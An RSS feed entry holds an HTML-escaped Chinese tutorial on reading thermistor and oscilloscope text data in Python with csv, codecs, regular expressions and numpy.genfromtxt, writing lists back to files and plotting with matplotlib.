+<guid isPermaLink="true" >http://www.cnblogs.com/ECJTUACM-873284962/p/8449346.html</guid>
+<description>&lt;div readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;Type: raw 
+Points: &lt;/span&gt;16200&lt;span&gt; 
+Count: &lt;/span&gt;1&lt;span&gt; 
+... 
+X Units: second 
+Y Units: Volt 
+XY Data: 
+&lt;/span&gt;2.4000000E-008, 1.4349E-002 
+2.4000123E-008, 1.6005E-002 
+2.4000247E-008, 1.5455E-002 
+2.4000370E-008, 1.5702E-002 
+2.4000494E-008, 1.5147E-002&lt;span&gt; 
+... &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;&lt;div readability=&quot;33&quot;&gt;
+&lt;pre&gt;
+2018-02-15 21:31:08.781 49.9492 
+2018-02-15 21:31:09.296 49.9589 
+2018-02-15 21:31:09.811 49.964 
+2018-02-15 21:31:10.326 49.9741 
+2018-02-15 21:31:10.841 49.983&lt;span&gt;
+...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;处理文本文件的第一步是&lt;strong&gt;通过 open 命令来获取一个文件对象&lt;/strong&gt;：&lt;/p&gt;&lt;div readability=&quot;37&quot;&gt;
+&lt;pre&gt;
+file_for_reading = open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;thermistor.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 'r' 意味着只读 &lt;/span&gt;
+file_for_writing = open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;thermistor.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;w&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 'w' 是写入 &lt;/span&gt;
+file_for_appending = open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;thermistor.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 'a' 是添加 &lt;/span&gt;
+file_for_xxx.close() &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 完成操作后要关闭文件 &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为非常容易忘记关闭文件，所以应该在 with 程序块里操作文件，这样结尾处文件会被自动关闭：&lt;/p&gt;&lt;div readability=&quot;33&quot;&gt;
+&lt;pre&gt;
+with open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;thermistor.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) as f:
+     data &lt;/span&gt;= function_that_gets_data_form(f) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 获取数据函数&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时，f 已经关闭了，就不能试图使用它啦，然后对数据执行相应的操作即可。&lt;/p&gt;&lt;div readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+process(data) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 处理数据函数&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;&lt;div readability=&quot;124.53804001529&quot;&gt;
+&lt;p&gt;处理文本文件第二步是&lt;strong&gt;观察数据特征，选择合适的读取命令&lt;/strong&gt;：通过观察，可以发现，文件没有头部，每一行包括三种数据 (编号，时间，温度) 他们之间以空格键分开，每一列是同一类数据，这样我们就可以用 Python 中的 csv 模块中的 csv.reader 对其进行迭代处理，每一行都会被处理成恰当划分的列表。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; csv 
+&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; with open(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;thermistor.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rb&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) as f: 
+&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;       reader = csv.reader(f,delimiter=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;       number=&lt;span&gt;[] 
+&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;       time =&lt;span&gt; [] 
+&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;       data=&lt;span&gt;[] 
+&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;       &lt;span&gt;for&lt;/span&gt; row &lt;span&gt;in&lt;/span&gt;&lt;span&gt; reader: 
+&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;           number.append(row[0]) 
+&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;            time.append(row[1&lt;span&gt;])  
+&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;            data.append(float(row[2])) 
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;处理文本文件的第三步是&lt;strong&gt;检测数据读取格式是否正确&lt;/strong&gt;，我们可以用如下的方式检测：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;print&lt;/span&gt; number[0], time[0], data[0] 
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; 2018-02-15 21:31:08.781 49.9492
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;从输出的首个元素来看，以上的读取数据的方式是没有问题的，但是到这里我们并不能完全放心我们的数据格式：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;print&lt;/span&gt; number[0:3], time[0:3], data[0:3] 
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\xef\xbb\xbf1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
+[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;2018-02-15 21:31:08.781&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2018-02-15 21:31:09.296&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2018-02-15 21:31:09.811&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;] 
+[&lt;/span&gt;49.9492, 49.9589, 49.964] 
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div readability=&quot;11&quot;&gt;
+&lt;p&gt;当我们以列表的形式输出时，number 中的首个元素出现了我们没有预料到的“乱码”，这其实是 &lt;strong&gt;BOM&lt;/strong&gt; (byte order mark), 它是为 UTF-16 和 UTF-32 准备的，用以标记字节序。微软在 UTF-8 中使用 BOM 是因为这样可以把 UTF-8 和 ASCII 等编码区别开，但这样的文件会给我们的数据读取带来问题。还好，我们可以用 Python 中的 &lt;strong&gt;codecs&lt;/strong&gt; 模块解决这个问题。&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; csv 
+&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; codecs 
+&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; with codecs.open(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;thermistor.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rb&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8-sig&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) as f: 
+&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     reader = csv.reader(f,delimiter=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     number=[] time=[] data=&lt;span&gt;[] 
+&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; row &lt;span&gt;in&lt;/span&gt;&lt;span&gt; reader: 
+&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; &lt;span&gt;        number.append(row[0]) 
+&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;         time.append(row[1&lt;span&gt;]) 
+&lt;/span&gt;&lt;span&gt;9&lt;/span&gt;         data.append(float(row[2])
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;此时，我们再以列表形式输出时，就会得到正确的结果：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;] 
+[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;2018-02-15 21:31:08.781&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2018-02-15 21:31:09.296&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2018-02-15 21:31:09.811&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;] 
+[&lt;/span&gt;49.9492, 49.9589, 49.964]
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;然后就可以用得到的数据进行处理分析啦~&lt;/p&gt;
+
+&lt;p&gt;有了上面的经验，我们直接从处理文本文件第二步开始，示波器数据相对上面的数据，复杂的地方在于它包含了&lt;strong&gt;表头&lt;/strong&gt;信息，而这些信息大部分时间是处理数据中不太需要的，它的数据格式如下：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;Type: raw 
+Points: &lt;/span&gt;16200&lt;span&gt; 
+Count: &lt;/span&gt;1&lt;span&gt; 
+XInc: &lt;/span&gt;1.23457E-013&lt;span&gt; 
+XOrg: &lt;/span&gt;2.4000000000E-008&lt;span&gt; 
+YData range: &lt;/span&gt;1.48000E-001&lt;span&gt; 
+YData center: &lt;/span&gt;5.00000E-004&lt;span&gt; 
+Coupling: &lt;/span&gt;50&lt;span&gt; 
+Ohms XRange: &lt;/span&gt;2.00000E-009&lt;span&gt; 
+XOffset: &lt;/span&gt;2.4000000000E-008&lt;span&gt; 
+YRange: &lt;/span&gt;1.44000E-001&lt;span&gt; 
+YOffset: &lt;/span&gt;5.00000E-004&lt;span&gt; 
+Date: &lt;/span&gt;15 APR 2018&lt;span&gt; 
+Time: &lt;/span&gt;16:00:54:74&lt;span&gt; 
+Frame: 86100C:MY46520443 
+X Units: second 
+Y Units: Volt 
+XY Data: 
+&lt;/span&gt;2.4000000E-008, 1.4349E-002 
+2.4000123E-008, 1.6005E-002 
+2.4000247E-008, 1.5455E-002 
+2.4000370E-008, 1.5702E-002 
+2.4000494E-008, 1.5147E-002&lt;span&gt; 
+... &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;可以看出，“表头”是一些参数信息，真正有用的数据是从 “XY Data:” 下一行开始的，对于这样的数据有两种方法进行读取：(1) 直接跳过“表头”读取数据；(2) 利用正则表达式寻找“表头” 和数据的不同特征进行识别读取。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;1&lt;/span&gt; with open(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;waveform.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rb&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) as f: 
+&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     lines = f.readlines() x=[] y=&lt;span&gt;[] 
+&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt; lines[18&lt;span&gt;:]: 
+&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;         x.append(float(line.replace(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&quot;&lt;/span&gt;).split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)[0])) 
+&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;         y.append(float(line.replace(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&quot;&lt;/span&gt;).split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)[1]))
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;通过观察我们发现有效数据是从第19行开始的，于是我们&lt;strong&gt;直接从19行开始读取数据&lt;/strong&gt;，跳过“表头”，以列表形式输出 x 和 y 前3个元素如下：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; [2.4e-08, 2.4000123e-08, 2.4000247e-08&lt;span&gt;] 
+[&lt;/span&gt;0.014349, 0.016005, 0.015455] &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 数据读取正确&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;运用正则表达式读取数据的关键在于&lt;strong&gt;找到有效数据行的独有特征&lt;/strong&gt;，这里以 “&lt;strong&gt;E-002&lt;/strong&gt;” 作为有效数据行区别于“表头”的特征，对数据的读取方式如下：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; re 
+&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; with open(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;waveform.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rb&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) as f: 
+&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     lines =&lt;span&gt; f.readlines() 
+&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     x=&lt;span&gt;[] 
+&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     y=&lt;span&gt;[] 
+&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt;&lt;span&gt; lines: 
+&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; re.search(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;E-002&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,line): 
+&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;             x.append(float(line.replace(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&quot;&lt;/span&gt;).split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)[0])) 
+&lt;/span&gt;&lt;span&gt;9&lt;/span&gt;             y.append(float(line.replace(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&quot;&lt;/span&gt;).split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)[1]))
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;同样，以列表形式输出 x 和 y 前3个元素用于检验：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; [2.4e-08, 2.4000123e-08, 2.4000247e-08&lt;span&gt;] 
+[&lt;/span&gt;0.014349, 0.016005, 0.015455] &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 数据读取正确&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div readability=&quot;9&quot;&gt;
+&lt;div readability=&quot;13&quot;&gt;
+&lt;p&gt;&lt;strong&gt;注：具体的数据读取方式要根据具体文本文件的特征决定，运用合适的方法才能得到更好的结果。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;很多时候，经过 process( ) 后的数据，需要备份留用或者供其他程序调用，因此，将处理后的数据&lt;strong&gt;写入文本文件&lt;/strong&gt;也将是关键的一步。根据数据读入的经验，被读入的数据经常存储在 list 中，那么处理后数据也通常存储在 list 中，因此，以 list 的写入作为例子：&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
+&lt;pre&gt;
+x = [1, 2, 3, 4&lt;span&gt;]
+y &lt;/span&gt;= [2.0, 4.0, 6.0, 8.0] &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 参考数据&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;接下来就要考虑的是要&lt;strong&gt;以什么样的格式保存数据&lt;/strong&gt;，为了更加直观的表现数据的关系，我们将 x，y 分别保存为一列，中间以空格键隔开，那么 &lt;strong&gt;csv.writer( )&lt;/strong&gt; 将是很好的工具：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;1&lt;/span&gt; xy =&lt;span&gt; {} 
+&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(len(x)): 
+&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     xy[x[i]] =&lt;span&gt; y[i] 
+&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; with open(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;15.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;wb&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) as f: 
+&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     writer = csv.writer(f,delimiter=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; x, y &lt;span&gt;in&lt;/span&gt;&lt;span&gt; xy.items(): 
+&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;         writer.writerow([x, y]) 
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;为了同时保存 x 和 y 的对应值，这里把 x 和 y 写入字典，x 为键 (key), y 为 值 (value) ，xy 就是 x 和 y 构成的字典。保存后的数据格式如下所示：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot;&gt;
+&lt;pre&gt;
+1   2.0
+2   4.0
+3   6.0
+4   8.0
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;由于字典的键 (key) 和值 (value) 对应的特殊数据结构，写入二维数据较为方便，对于多维数据，我们就需要构建&lt;strong&gt;多维矩阵&lt;/strong&gt;，或者&lt;strong&gt;列表与元组结合&lt;/strong&gt;的方式录入：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
+&lt;pre&gt;
+x = [1, 2, 3, 4&lt;span&gt;]
+y &lt;/span&gt;= [2.0, 4.0, 6.0, 8.0&lt;span&gt;]
+z &lt;/span&gt;= [3.0, 6.0, 9.0, 12.0]
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;这里以三维数据为例子。同样，需要将 x，y，z 各一列写入到txt中：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;1&lt;/span&gt; xyz =&lt;span&gt; [] 
+&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(len(x)): 
+&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;    xyz.append([x[i],y[i],z[i]]) 
+&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; with open(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;15.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;wb&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) as f: 
+&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     writer = csv.writer(f,delimiter=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; x, y, z &lt;span&gt;in&lt;/span&gt;&lt;span&gt; xyz: 
+&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;         writer.writerow([x, y, z]) 
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;这样，就可以很容易地得到需要的数据格式的文本文件：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+1   2.0 3.0
+2   4.0 6.0
+3   6.0 9.0
+4   8.0 12.0
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div readability=&quot;8.5&quot;&gt;
+&lt;div readability=&quot;12&quot;&gt;
+&lt;p&gt;我们已经提到了两种方法读取上述的数据，它们共同点是将数据存储在列表中，正如开头所说，列表在处理大量数据时是非常缓慢的。那么，我们就来看一看 &lt;strong&gt;numpy.genfromtxt&lt;/strong&gt; 如何大显身手。&lt;/p&gt;
+
+&lt;p&gt;为了得到我们需要的有用数据，我们有两个硬的要求： (1) &lt;strong&gt;跳过表头信息&lt;/strong&gt;；(2) &lt;strong&gt;区分横纵坐标&lt;/strong&gt;。&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;import&lt;/span&gt;&lt;span&gt; numpy as np
+data &lt;/span&gt;= np.genfromtxt(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;waveform.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,delimiter=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,skip_header=18)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div readability=&quot;28.793559042114&quot;&gt;
+&lt;p&gt;**delimiter: &lt;strong&gt;the str used to separate data. 横纵坐标以 ',' 分割，因此给 &lt;strong&gt;delimiter&lt;/strong&gt; 传入 ','。&lt;/strong&gt;skip_header: ** the number of lines to skip at the beginning of the file. 有用数据是从19行开始的，因此给 &lt;strong&gt;skip_header&lt;/strong&gt; 传入 18。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;print&lt;/span&gt; data[0:3,0], data[0:3,1]
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;因为读入的是二维数据，因此利用 numpy &lt;strong&gt;二维数据的切片方式&lt;/strong&gt; (Index slicing) 输出各自的前三个数据验证是否读取正确：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+[  2.40000000e-08   2.40001230e-08   2.40002470e-08&lt;span&gt;]
+[ &lt;/span&gt;0.014349  0.016005  0.015455]
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;对数据进行归一化处理后，调用 &lt;strong&gt;Matplotlib&lt;/strong&gt; 画图命令，就可得到图像如下：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; matplotlib.pyplot as plt 
+&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; fig, axes = plt.subplots(figsize=(8,6&lt;span&gt;)) 
+&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; axes.plot(x, y, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, linewidth=3&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; axes.set_xlabel(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Time(ps)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; axes.set_ylabel(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Amplitude[a.u.]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
+&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; fig.savefig(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;triangular.png&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, dpi=600)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;image-view&quot; data-width=&quot;4800&quot; data-height=&quot;3600&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/2526000-bddc79b58cc79e36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/2526000-bddc79b58cc79e36.png&quot; data-original-width=&quot;4800&quot; data-original-height=&quot;3600&quot; data-original-format=&quot;image/png&quot; data-original-filesize=&quot;344353&quot;/&gt;&lt;/div&gt;
+&lt;p&gt;                                                                          triangular waveform&lt;/p&gt;
+&lt;div class=&quot;image-caption&quot; readability=&quot;7.956&quot;&gt;
+
+&lt;p&gt;&lt;strong&gt;numpy.genformtxt( )&lt;/strong&gt; 函数提供了众多的入参，实现不同格式数据的读取，详情可参考：&lt;a href=&quot;https://link.jianshu.com/?t=http://docs.scipy.org/doc/numpy/reference/generated/numpy.genfromtxt.html&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;numpy.genfromtxt&lt;/a&gt;&lt;br/&gt;此外，numpy 中还提供了将数据存储为 &lt;strong&gt;CSV&lt;/strong&gt; 格式的函数 &lt;strong&gt;numpy.savetxt( )&lt;/strong&gt;，详情可参考：&lt;a href=&quot;https://link.jianshu.com/?t=http://docs.scipy.org/doc/numpy/reference/generated/numpy.savetxt.html&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;numpy.savetxt&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+<pubDate>Thu, 15 Feb 2018 03:31:00 +0000</pubDate>
+<dc:creator>Angel_Kitty</dc:creator>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
